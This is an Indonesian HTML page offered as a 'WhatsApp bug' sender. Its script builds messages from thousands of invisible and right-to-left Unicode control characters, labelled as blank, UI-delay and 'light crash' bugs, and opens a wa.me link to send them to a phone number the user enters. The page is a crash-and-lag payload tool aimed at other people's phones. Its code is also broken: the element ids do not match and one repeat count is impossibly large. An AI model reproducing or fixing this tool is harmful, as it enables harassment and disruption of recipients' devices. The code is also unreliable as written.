<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>BUG WA AUTO-ADD</title>
  <style>
    body {
      background-color: #121212;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
    }
    input, select, button {
      padding: 12px;
      margin: 10px;
      border-radius: 10px;
      font-size: 18px;
      border: none;
      width: 80%;
      max-width: 400px;
    }
    button {
      background: #25D366;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>ðŸ’¥ BUG WA AUTO-ADD + SENDER</h2>
  <input id="6288212464391" placeholder="Contoh: 6288212464391"><br>
  <select id="nomor">
    <option value="blank">Blank Bug</option>
    <option value="ui">UI Delay</option>
    <option value="crash">Crash Ringan</option>
  </select><br>
  <button onclick="kirim()">KIRIM SEKARANG</button>

  <script>
    function getBug(jenis) {
      if (jenis === "blank") return "\u2063".repeat(6000);
      if (jenis === "ui") return "\u200F\u202E\u2063\u3164".repeat(9999999999);
      if (jenis === "crash") return "\u202E".repeat(1500) + "ðŸ”’".repeat(500);
    }

    function kirim() {
      let nomor = document.getElementById("nomor").value.trim();
      let jenis = document.getElementById("jenis").value;

      if (!nomor.startsWith("62")) {
        alert("Gunakan nomor awalan 62 (Indonesia)");
        return;
      }

      let bug = encodeURIComponent(getBug(jenis));
      let waUrl = `https://wa.me/${nomor}?text=${bug}`;
      window.open(waUrl, "_blank");
    }
  </script>
</body>
</html>
